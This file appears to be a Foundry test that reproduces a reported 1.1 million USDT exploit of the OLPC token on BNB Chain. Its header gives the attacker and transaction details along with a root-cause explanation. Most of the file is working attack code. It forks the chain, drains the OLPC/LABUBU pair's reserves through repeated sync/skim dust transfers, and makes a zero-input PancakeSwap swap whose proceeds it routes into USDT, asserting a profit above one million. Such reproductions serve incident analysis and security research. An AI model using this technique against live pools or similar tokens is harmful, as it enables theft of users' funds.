// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1,115,903.66 USDT
// Attacker : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Attack Contract : 0x18d6c39ae9e537f948aa2212d44d8c23944fc188
// Vulnerable Contract : 0x58815cdf9955121a6274680ab396a36fc9e00000
// Attack Tx : https://bscscan.com/tx/0x8dabb60a94e5124462e5f494a25c14bcd52f6f4d1f7c665a249496f4c6c24764

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x58815cdf9955121a6274680ab396a36fc9e00000#code

// @Analysis
// Twitter Guy : https://x.com/exvulsec/status/2068308334512365924
// Root Cause : OLPC owner set decimalsValue to 7326680472586200649 at BSC block 96479712
// (2026-05-05 08:19:47 UTC), making tiny dust transfers force large pair balance decay.
// Setup Tx : https://bscscan.com/tx/0xa413fdf688398348ddf0246275c6fe3a98806670252e44bfe0acd50b4d50efa2
//
// The OLPC token's transfer hook updates price state from Pancake pairs and allows the OLPC/LABUBU
// pair reserve to be synchronized to a manipulated token balance. After repeated sync/skim cycles,
// a Pancake supporting-fee swap with amountIn = 0 reads the inflated OLPC pair balance as input and
// releases LABUBU, which is routed through WBNB into USDT.

address constant OLPC = 0x58815CDF9955121a6274680ab396a36FC9e00000;
address constant LABUBU = 0x3494dfE19b721DAC6c5c8d7470c8F89548177777;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant OLPC_LABUBU_PAIR = 0xedB7DCB4cDFEc957F8Df5cBf5E94229a6CC9F365;
address constant SKIM_RECEIVER = 0xc0F1Ef7FE2ae3AAD0175af192713d36eD151755a;
address constant BURN_ADDRESS = 0x000000000000000000000000000000000000dEaD;
bytes4 constant HOOK_APPLY_SELECTOR = 0xe172f16c;
bytes4 constant HOOK_PASS_THROUGH_SELECTOR = 0x8f2de77d;
bytes4 constant PROXY_SWAP_SELECTOR = 0xb1ca4936;

interface ICustomToken is IERC20 {
    function isTaxExempt(
        address account
    ) external view returns (bool);

    function decimalsValue() external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    BridgeSwapRouter private bridgeRouter;
    TaxExemptBridgeProxy private bridgeProxy;

    function setUp() public {
        uint256 forkBlock = 105_326_392;
        vm.createSelectFork("bsc", forkBlock);

        fundingToken = USDT_TOKEN;
        attacker = address(this);

        vm.label(OLPC, "OLPC");
        vm.label(LABUBU, "LABUBU");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(PANCAKE_ROUTER, "PancakeSwap V2 Router");
        vm.label(OLPC_LABUBU_PAIR, "OLPC/LABUBU Pair");

        bridgeProxy = new TaxExemptBridgeProxy();
        bridgeRouter = new BridgeSwapRouter(address(bridgeProxy));
        PassThroughBridgeHook olpcHook = new PassThroughBridgeHook(OLPC);
        LabubuFeeHook labubuFeeHook = new LabubuFeeHook();

        bridgeRouter.setHook(OLPC, address(olpcHook));
        bridgeRouter.setHook(LABUBU, address(labubuFeeHook));
        bridgeProxy.approveToken(LABUBU, address(bridgeRouter));
        bridgeProxy.approveToken(LABUBU, PANCAKE_ROUTER);

        vm.label(address(bridgeRouter), "Local bridge router");
        vm.label(address(bridgeProxy), "Local tax-exempt bridge proxy");
        vm.label(address(olpcHook), "Local OLPC bridge hook");
        vm.label(address(labubuFeeHook), "Local LABUBU fee hook");

        // Historical helper 0x0e3c... was LABUBU tax-exempt. Patch the same token-side state for the local proxy.
        bytes32 taxExemptSlot = keccak256(abi.encode(address(bridgeProxy), uint256(42)));
        vm.store(LABUBU, taxExemptSlot, bytes32(uint256(1)));
        assertTrue(ICustomToken(LABUBU).isTaxExempt(address(bridgeProxy)));

        deal(OLPC, address(this), 10.143_931_370_302_072_322 ether);
    }

    function testExploit() public balanceLog {
        uint256 beforeUsdt = IERC20(USDT_TOKEN).balanceOf(address(this));

        // step 1: seed the OLPC/LABUBU pair and force OLPC reserves through the trace's sync/skim decay.
        uint256 reserveDecayTargetDivisor = 10;
        IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, 1 ether);
        uint256 dustTransfer = _initialDustTransfer(reserveDecayTargetDivisor);
        for (uint256 i = 0; i < 20; i++) {
            IPancakePair(OLPC_LABUBU_PAIR).sync();
            IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, dustTransfer);
            IPancakePair(OLPC_LABUBU_PAIR).skim(SKIM_RECEIVER);
            dustTransfer = dustTransfer / reserveDecayTargetDivisor;
        }

        // step 2: final OLPC transfer leaves 8.1 OLPC above reserves for Pancake's supporting-fee swap.
        IPancakePair(OLPC_LABUBU_PAIR).sync();
        IERC20(OLPC).transfer(OLPC_LABUBU_PAIR, 9 ether);

        // step 3: the bridge wrapper calls Pancake with amountIn = 0 and then routes LABUBU through its hooks/proxy.
        uint256 wrapperAmount = 0;
        uint256 targetNetwork = 1;
        uint256 traceDeadline = 781_328_217_393;
        bridgeRouter.swap(OLPC, wrapperAmount, targetNetwork, USDT_TOKEN, address(this), traceDeadline);

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(address(this)) - beforeUsdt;
        assertGt(profit, 1_000_000 ether);
    }

    function _initialDustTransfer(
        uint256 reserveDecayTargetDivisor
    ) private view returns (uint256) {
        uint256 olpcSellNetNumerator = 9000;
        uint256 olpcSellNetDenominator = 10_000;
        uint256 pairBalance = IERC20(OLPC).balanceOf(OLPC_LABUBU_PAIR);
        uint256 targetBalance = pairBalance / reserveDecayTargetDivisor;
        uint256 burnScale = ICustomToken(OLPC).decimalsValue();

        // Skim leaves pairBalance - skimAmount * (decimalsValue() - 1); choose dust that targets 10% balance.
        uint256 skimAmount = _roundDiv(pairBalance - targetBalance, burnScale - 1);
        return (skimAmount * olpcSellNetDenominator) / olpcSellNetNumerator;
    }

    function _roundDiv(
        uint256 numerator,
        uint256 denominator
    ) private pure returns (uint256) {
        return (numerator + denominator / 2) / denominator;
    }
}

contract BridgeSwapRouter {
    mapping(address => address) public hookAddress;
    address public proxyContractAddress;

    constructor(
        address proxy
    ) {
        proxyContractAddress = proxy;
    }

    function setHook(
        address token,
        address hook
    ) external {
        hookAddress[token] = hook;
        IERC20(token).approve(hook, type(uint256).max);
    }

    function swap(
        address token,
        uint256 amount,
        uint256 targetNetwork,
        address targetToken,
        address targetAddress,
        uint256 swapBridgeAmount
    ) external returns (uint256) {
        require(targetToken == USDT_TOKEN || targetToken == LABUBU, "Invalid tokenOut");

        uint256 balanceBefore = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        uint256 received = IERC20(token).balanceOf(address(this)) - balanceBefore;

        address inputHook = hookAddress[token];
        _callHook(inputHook, HOOK_APPLY_SELECTOR, msg.sender, token, targetToken, received);

        uint256 bridgeAmount;
        if (token == LABUBU) {
            bridgeAmount = received;
        } else {
            IERC20(token).approve(PANCAKE_ROUTER, received);

            uint256 bridgeBefore = IERC20(LABUBU).balanceOf(proxyContractAddress);
            address[] memory firstPath = new address[](2);
            firstPath[0] = token;
            firstPath[1] = LABUBU;
            // In the trace `received` is zero. Pancake still infers input from the pair's excess OLPC balance
            // over its stored reserve, which the previous sync/skim loop and 9 OLPC transfer created.
            IPancakeRouter(payable(PANCAKE_ROUTER))
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    received, 1, firstPath, proxyContractAddress, swapBridgeAmount
                );
            bridgeAmount = IERC20(LABUBU).balanceOf(proxyContractAddress) - bridgeBefore;

            IERC20(LABUBU).transferFrom(proxyContractAddress, address(this), bridgeAmount);
        }

        bridgeAmount = _callHook(inputHook, HOOK_PASS_THROUGH_SELECTOR, msg.sender, LABUBU, targetToken, bridgeAmount);

        address bridgeHook = hookAddress[LABUBU];
        bridgeAmount = _callHook(bridgeHook, HOOK_APPLY_SELECTOR, address(0), LABUBU, targetToken, bridgeAmount);

        IERC20(LABUBU).transfer(proxyContractAddress, bridgeAmount);

        address[] memory route = new address[](3);
        route[0] = LABUBU;
        route[1] = WBNB_TOKEN;
        route[2] = targetToken;
        return _callProxySwap(targetNetwork, route, targetAddress, bridgeAmount, swapBridgeAmount);
    }

    function _callHook(
        address hook,
        bytes4 selector,
        address account,
        address token,
        address targetToken,
        uint256 amount
    ) private returns (uint256) {
        (bool ok, bytes memory ret) = hook.call(abi.encodeWithSelector(selector, account, token, targetToken, amount));
        require(ok, "hook failed");
        return ret.length >= 32 ? abi.decode(ret, (uint256)) : amount;
    }

    function _callProxySwap(
        uint256 targetNetwork,
        address[] memory route,
        address targetAddress,
        uint256 bridgeAmount,
        uint256 swapBridgeAmount
    ) private returns (uint256) {
        (bool ok, bytes memory ret) = proxyContractAddress.call(
            abi.encodeWithSelector(
                PROXY_SWAP_SELECTOR, PANCAKE_ROUTER, bridgeAmount, targetNetwork, route, targetAddress, swapBridgeAmount
            )
        );
        require(ok, "proxy swap failed");
        return ret.length >= 32 ? abi.decode(ret, (uint256)) : bridgeAmount;
    }
}

contract PassThroughBridgeHook {
    address public immutable token;

    constructor(
        address hookedToken
    ) {
        token = hookedToken;
    }

    fallback(
        bytes calldata input
    ) external returns (bytes memory) {
        require(msg.sig == HOOK_APPLY_SELECTOR || msg.sig == HOOK_PASS_THROUGH_SELECTOR, "unknown hook selector");
        (, address tokenIn,, uint256 amount) = abi.decode(input[4:], (address, address, address, uint256));
        require(tokenIn == token || tokenIn == LABUBU, "unexpected hook token");
        require(msg.sig != HOOK_APPLY_SELECTOR || amount == 0, "unexpected OLPC hook amount");
        return abi.encode(amount);
    }
}

contract LabubuFeeHook {
    fallback(
        bytes calldata input
    ) external returns (bytes memory) {
        require(msg.sig == HOOK_APPLY_SELECTOR, "unknown fee hook selector");
        (, address tokenIn,, uint256 amount) = abi.decode(input[4:], (address, address, address, uint256));
        require(tokenIn == LABUBU, "unexpected fee token");

        uint256 sellTaxPercent = 1805;
        uint256 nodeRate = 500;
        uint256 basePercent = 10_000;
        uint256 totalTax = (amount * sellTaxPercent) / basePercent;
        uint256 nodeFee = (amount * nodeRate) / basePercent;
        uint256 burnFee = totalTax - nodeFee;
        IERC20(LABUBU).transferFrom(msg.sender, BURN_ADDRESS, nodeFee);
        IERC20(LABUBU).transferFrom(msg.sender, BURN_ADDRESS, burnFee);

        return abi.encode(amount - totalTax);
    }
}

contract TaxExemptBridgeProxy {
    function approveToken(
        address token,
        address spender
    ) external {
        IERC20(token).approve(spender, type(uint256).max);
    }

    fallback(
        bytes calldata input
    ) external returns (bytes memory) {
        require(msg.sig == PROXY_SWAP_SELECTOR, "unknown proxy selector");
        (address router, uint256 amount,, address[] memory path, address profitReceiver, uint256 deadline) =
            abi.decode(input[4:], (address, uint256, uint256, address[], address, uint256));

        uint256 beforeBalance = IERC20(path[path.length - 1]).balanceOf(profitReceiver);
        IERC20(path[0]).approve(router, amount);
        IPancakeRouter(payable(router))
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 1, path, profitReceiver, deadline);
        return abi.encode(IERC20(path[path.length - 1]).balanceOf(profitReceiver) - beforeBalance);
    }
}
